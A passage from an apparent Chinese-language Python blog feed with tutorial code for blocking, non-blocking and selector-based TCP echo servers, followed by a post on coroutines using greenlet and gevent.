title="1.阻塞的套接字"></a>1.阻塞的套接字</h4><blockquote><p>阻塞套接字不能和多个客户端进行通信</p></blockquote><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">服务端：</span></span><br><span class="line"><span class="string">阻塞套接字：  ---&gt;  阻塞套接字不能和多个客户端进行通信</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">''</span>   <span class="comment"># 如果是本机最为服务端，地址可以不用填写</span></span><br><span class="line">PORT = <span class="number">8888</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line">tcp_server = socket.socket()   <span class="comment"># type默认是tcp</span></span><br><span class="line"><span class="comment">#tcp_server.bind(('',8888))     </span></span><br><span class="line">tcp_server.bind(ADDR)    </span><br><span class="line">tcp_server.listen(<span class="number">5</span>)           <span class="comment"># 可以挂起的最大连接数    accept就不算挂起</span></span><br><span class="line">print(<span class="string">"开始监听"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 服务端和客户端的循环连接</span></span><br><span class="line">    print(<span class="string">"Waiting fpr connecting..."</span>)</span><br><span class="line">    coon, addr = tcp_server.accept()  <span class="comment"># 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞</span></span><br><span class="line">    print(<span class="string">"... connected from:"</span> + str(addr))</span><br><span class="line">    <span class="comment"># 下面是通信的循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = coon.recv(BUFSIZE)          <span class="comment"># 读取客户端发送的消息 （指明一次性能接收的最大字节数量）</span></span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            print(data.decode())</span><br><span class="line">            <span class="comment"># 向client发送收到的信息</span></span><br><span class="line">            coon.send(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"客户端&#123;&#125;已断开"</span>.format(addr))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"> <span class="comment">#server端关闭连接</span></span><br><span class="line"><span class="comment">#tcp_server.close()</span></span><br><span class="line"><span class="comment">#accpet 阻塞   recv阻塞(读不到数据，就一直等到有数据为止)</span></span><br></pre></td></tr></table></figure><p>client.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">最简单的客户端</span></span><br><span class="line"><span class="string">三种方式的客户端都是一样的</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">''</span>   <span class="comment"># 如果是本机最为服务端，地址可以不用填写</span></span><br><span class="line">PORT = <span class="number">8888</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">tcp_cient = socket.socket()</span><br><span class="line">tcp_cient.connect(ADDR)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"客户端：\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据交互循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    msg = input(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    <span class="keyword">if</span> msg:</span><br><span class="line">        tcp_cient.send(msg.encode())   <span class="comment"># 只能发送 bytes 类型的数据</span></span><br><span class="line">        data = tcp_cient.recv(BUFSIZE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(data.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp_cient.close()</span></span><br><span class="line"><span class="comment"># c.close()    # 主动断开   # 服务端会recv到一个空字符串</span></span><br></pre></td></tr></table></figure><h4 id="2-I-O多路复用的套接字"><a href="#2-I-O多路复用的套接字" class="headerlink" title="2.I/O多路复用的套接字"></a>2.I/O多路复用的套接字</h4><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">服务端</span></span><br><span class="line"><span class="string">I/O多路复用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IO多路复用</span></span><br><span class="line"><span class="comment"># epoll  事件通知事件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IO事件  计算机  可读事件（有数据了...）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通知机制       （某一事情发送之后，可读之后）  轮询</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># epoll： 当socket变为可读的时候，发出通知</span></span><br><span class="line"><span class="comment"># epoll： 是惰性的事件回调：    操作系统只起到通知的作用。</span></span><br><span class="line"><span class="comment"># epoll： 目前Linux上效率最高的IO多路复用 技术 ！</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.监听套接字  2.对等套接字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> selectors</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows没有epoll</span></span><br><span class="line">sel = selectors.DefaultSelector()   <span class="comment"># 会根据不同的操作系统选择相应的解释器   在linux是epoll   根据系统自动选择</span></span><br><span class="line">sel2 = selectors.EpollSelector()   <span class="comment"># 会根据不同的操作系统选择相应的解释器   在linux是epoll     Linux</span></span><br><span class="line"></span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">'127.0.0.1'</span>,<span class="number">8888</span>))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accept</span><span class="params">(server)</span>:</span></span><br><span class="line">    coon, addr = server.accept()</span><br><span class="line">    sel.register(coon, selectors.EVENT_READ, read)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(coon)</span>:</span></span><br><span class="line">    data = coon.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        print(data)</span><br><span class="line">        server.send(data.encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'Closing:'</span>,coon)</span><br><span class="line">        sel.unregister(coon)   <span class="comment"># 取消监听</span></span><br><span class="line">        coon.close()</span><br><span class="line"><span class="comment"># 注册事件  事件触发直接调用</span></span><br><span class="line">sel.register(server, selectors.EVENT_READ, accept)   <span class="comment"># 监听事件的发生  参数三个： 套接字,可能发送的事件(变为可读事件),回调函数</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"开始监听"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    events_list = sel.select()   <span class="comment"># 返回发生了事件的列表  查询已经准备好的套接字</span></span><br><span class="line">    print(<span class="string">"有套接字发生变化"</span>)</span><br><span class="line">    <span class="keyword">for</span> key, _ <span class="keyword">in</span> events_list:  <span class="comment"># 列表里面是个元组, key是元组里面的第一个值</span></span><br><span class="line">        callback = key.data   <span class="comment"># 某个套接字绑定的函数  key.data是函数</span></span><br><span class="line">        callback(key.fileobj)   <span class="comment"># 调用这个回调函数     fileobj是对应套接字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sel.select()     有两种情况：</span></span><br><span class="line"><span class="comment">#1.  客户端请求连接 key.data是accept  key.fileobj 是server</span></span><br><span class="line"><span class="comment">#2.  客户端请求连接 key.data是read  key.fileobj 是conn</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">1.先在指定的套接字上注册对应的事件及回调</span></span><br><span class="line"><span class="string">2.不断的查询所有已经准备好资源的套接字</span></span><br><span class="line"><span class="string">3.不需要考虑套接字与事件只管调用</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>client.py 相同</p><h4 id="3-非阻塞的套接字"><a href="#3-非阻塞的套接字" class="headerlink" title="3.非阻塞的套接字"></a>3.非阻塞的套接字</h4><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">服务端</span></span><br><span class="line"><span class="string">非阻塞套接字</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket()           <span class="comment"># type默认是tcp</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个必须在操作之前设置</span></span><br><span class="line">s.setblocking(<span class="literal">False</span>)   <span class="comment"># 变为非阻塞套接字， 立刻返回异常</span></span><br><span class="line"></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">client_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:        <span class="comment"># 第一层循环只负责生成对等套接字</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        coon, addr = s.accept()     <span class="comment"># 多个coon才能与多个客户端进行通信</span></span><br><span class="line">    <span class="keyword">except</span> BlockingIOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"客户端&#123;&#125;连接成功"</span>.format(addr))</span><br><span class="line">        coon.setblocking(<span class="literal">False</span>)  <span class="comment"># 设置为非阻塞</span></span><br><span class="line">        client_list.append(coon)   <span class="comment"># 保留已生成的对等套接字</span></span><br><span class="line">        <span class="comment"># print(coon, addr)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> client_socket <span class="keyword">in</span> client_list:   <span class="comment"># 第二层循环 把所有已保留的套接字都执行一遍</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> BlockingIOError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                print(<span class="string">'&#123;&#125;:&#123;&#125;'</span>.format(client_socket, data.decode()))</span><br><span class="line">                client_socket.send(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'&#123;&#125;'</span>.format(client_socket))</span><br><span class="line">                client_socket.close()</span><br><span class="line">                client_list.remove(client_socket)    <span class="comment"># 成功处理完一个，就移除一个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 实现方法：非阻塞+轮询</span></span><br><span class="line"><span class="comment"># connect操作一定会引发BlockingIOError异常</span></span><br><span class="line"><span class="comment"># 如果连接没有建立，那么send操作引发OSError异常</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">accept 阻塞：</span></span><br><span class="line"><span class="string">在没有新的套接字来之前，</span></span><br><span class="line"><span class="string">不能处理已经建立连接的套接字的请求</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">recv 阻塞:</span></span><br><span class="line"><span class="string">在没有接受到客户端请求数据之前，</span></span><br><span class="line"><span class="string">不能与其他客户端建立连接</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>client.py 相同</p><hr><h6 id="成为大师"><a href="#成为大师" class="headerlink" title="成为大师"></a>成为大师</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">1. 多练习，一定要善于发现感兴趣的内容，通过所学知识去实现</span></span><br><span class="line"><span class="string">2. 关注相关领域：</span></span><br><span class="line"><span class="string">寻找大师，跟随大市，与大师同行，洞察大师，成为大师</span></span><br><span class="line"><span class="string">知乎，ve2x.com, github</span></span><br><span class="line"><span class="string">3.扩展：</span></span><br><span class="line"><span class="string">想要提高，就不能守着自己现有的东西而不去学习新的</span></span><br><span class="line"><span class="string">4.应用：</span></span><br><span class="line"><span class="string">根据自己的需求，动手实践，达到目标</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">安全：</span></span><br><span class="line"><span class="string">分析行为：通过日志，分析攻击行为(re)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;讲解&quot;&gt;&lt;a href=&quot;#讲解&quot; class=&quot;headerlink&quot; title=&quot;讲解&quot;&gt;&lt;/a&gt;讲解&lt;/h2&gt;&lt;h4 id=&quot;C-S架构&quot;&gt;&lt;a href=&quot;#C-S架构&quot; class=&quot;headerlink&quot; title=&quot;C/S架构&quot;&gt;&lt;/a&gt;C/S架
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="socket" scheme="http://www.xpshuai.cn/tags/socket/"/>
    
  </entry>
  
  <entry>
    <title>python-协程</title>
    <link href="http://www.xpshuai.cn/python-%E5%8D%8F%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-协程/</id>
    <published>2020-02-24T03:19:26.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 协程   =&gt;又叫：非抢占式多任务</span></span><br><span class="line"><span class="comment"># 中断执行</span></span><br><span class="line"><span class="comment"># 线程</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">pip install greenlet</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本使用</span></span><br><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Producer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        item = random.randint(<span class="number">0</span>, <span class="number">99</span>)</span><br><span class="line">        print(<span class="string">"pro生产了&#123;&#125;"</span>.format(item))</span><br><span class="line">        c.switch(item)    <span class="comment"># 暂停当前协程， 切换到(执行的协程)消费者，并将item传入消费者</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Consumer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        item = p.switch()    <span class="comment"># 切换到生产者， 并等待消费者传入item</span></span><br><span class="line">        print(<span class="string">"消费了&#123;&#125;"</span>.format(item))</span><br><span class="line"></span><br><span class="line">c = greenlet(Consumer)   <span class="comment"># 将一个普通函数变成协程</span></span><br><span class="line">p = greenlet(Producer)</span><br><span class="line">c.switch()      <span class="comment"># 让消费者先进入暂停状态， （只有恢复的时候才能接受数据）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># greenlet 的价值</span></span><br><span class="line"><span class="string">价值一： 高性能的原生协程</span></span><br><span class="line"><span class="string">价值二： 语义更加明确的显式切换</span></span><br><span class="line"><span class="string">价值三： 直接将函数包装成协程，保持原有代码风格</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gevent   # 当一个greenlet遇到IO操作，比如访问网络，就会自动切换，直到IO操作完成，再切换回来</span></span><br><span class="line"><span class="comment"># 遇到阻塞就切换到 另一个协程继续执行 ！</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">pip install gevent</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gevent，通过封装了 libev（基于epoll） 和 greenlet 两个库。</span></span><br><span class="line"><span class="string">帮我们做好封装，允许我们以类似于线程的方式使用协程。</span></span><br><span class="line"><span class="string">以至于我们几乎不用重写原来的代码就能充分利用 epoll 和 协程 威力</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent.queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="comment">#  猴子补丁   monkey    将一些阻塞的模块动态的修改为非阻塞</span></span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey;monkey.patch_all()  <span class="comment"># 不会阻塞了就</span></span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey;monkey.patch_socket()  <span class="comment"># 不会阻塞了就</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_response</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start"</span>)</span><br><span class="line">    requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    print(<span class="string">"end"</span>)</span><br><span class="line"></span><br><span class="line">tasks = [gevent.spawn(get_response) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">gevent.joinall(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### gevent 并发服务器</span></span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="comment"># 将python内置的socket直接换成了IO多路复用的socket</span></span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey;monkey.patch_socket()</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">server.listen(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker_coroutine</span><span class="params">(conn)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_data = conn.recv(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> recv_data:</span><br><span class="line">            print(recv_data)</span><br><span class="line">            conn.send(recv_data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, remote_addr = server.accept()</span><br><span class="line">        <span class="comment"># 生成一个协程， 并将conn作为参数传入</span></span><br><span class="line">        gevent.spawn(worker_coroutine, conn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gevent 协程通信</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">问题一： 协程之间不是能通过switch通信嘛？</span></span><br><span class="line"><span class="string">是的，由于 gevent 基于 greenlet，所以可以。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">问题二： 那为什么还要考虑通信问题？</span></span><br><span class="line"><span class="string">因为 gevent 不需要我们使用手动切换，</span></span><br><span class="line"><span class="string">而是遇到阻塞就切换，因此我们不会去使用switch ！</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey;monkey.patch_all()</span><br><span class="line"><span class="keyword">from</span> gevent.queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">queue = Queue(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Producer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        item = random.randint(<span class="number">0</span>, <span class="number">99</span>)</span><br><span class="line">        print(<span class="string">"生产了&#123;&#125;"</span>.format(item))</span><br><span class="line">        queue.put(item)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Consumer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        item = queue.get()</span><br><span class="line">        print(<span class="string">"消费了&#123;&#125;"</span>.format(item))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = gevent.spawn(Producer, queue)  <span class="comment"># 将函数封装成协程， 并开始调度</span></span><br><span class="line">c = gevent.spawn(Consumer, queue)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gevent.sleep(5)</span></span><br><span class="line">gevent.joinall([p, c])    <span class="comment"># 阻塞（一阻塞就切换协程） 等待   等待你带进来的所有协程对象结束</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="协程" scheme="http://www.xpshuai.cn/tags/%E5%8D%8F%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python-自带的线程池和进程池</title>
